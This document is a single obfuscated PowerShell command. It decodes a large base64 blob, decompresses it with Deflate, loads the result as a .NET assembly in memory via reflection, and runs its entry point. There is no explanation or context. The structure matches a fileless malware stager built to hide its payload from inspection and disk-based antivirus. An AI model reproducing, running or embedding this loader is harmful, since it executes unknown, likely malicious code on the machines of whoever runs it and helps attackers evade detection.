sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null